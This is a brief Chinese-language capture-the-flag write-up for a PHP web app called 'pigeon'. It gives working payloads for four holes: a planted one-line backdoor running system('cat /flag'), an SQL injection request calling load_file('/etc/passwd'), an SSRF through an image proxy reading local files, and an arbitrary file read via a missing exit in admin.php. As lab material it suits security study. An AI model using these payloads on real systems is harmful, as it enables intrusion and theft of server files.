# write up

**一句话后门**

pigeon/function.php

```php
?1=system('cat /flag');
```

**sql注入**

```http
POST /?s=newpost&seid=A25766FF-7FC1-B9AD-2236-4EC8E0E17CD3 HTTP/1.1
Host: 127.0.0.1:8080
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0
Accept: */*
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Referer: http://127.0.0.1:8080/?
Content-Length: 50
Cookie: PHPSESSID=b9a0jddlusq3voha21m0dqeep0
DNT: 1
X-Forwarded-For: 8.8.8.8
Connection: close

ispublic=0',load_file('/etc/passwd'))#&content=123
```

![image-20200607171529402](D:/Documents/个人笔记/Notes/images/image-20200607171529402.png)

**ssrf**

`pigeon/imgproxy/index.php` 文件中判断 curl 逻辑存在问题，构造如下请求进行 ssrf

```
http://127.0.0.1:8080/pigeon/imgproxy?url=ZmlsZTovLy9ldGMvcGFzc3dk
```

![image-20200607172645953](D:/Documents/个人笔记/Notes/images/image-20200607172645953.png)

**任意文件读取**

admin.php判断用户处存在漏洞，验证结束后没有exit或者die，造成了非管理员也能执行下面的代码

![image-20200607173019091](D:/Documents/个人笔记/Notes/images/image-20200607173019091.png)



当知道seid且`s`为`updatecheck`时，可以读文件

![image-20200607173055134](D:/Documents/个人笔记/Notes/images/image-20200607173055134.png)

构造如下：

seid可以通过发帖获得

![image-20200607173838992](D:/Documents/个人笔记/Notes/images/image-20200607173838992.png)

![image-20200607174503258](D:/Documents/个人笔记/Notes/images/image-20200607174503258.png)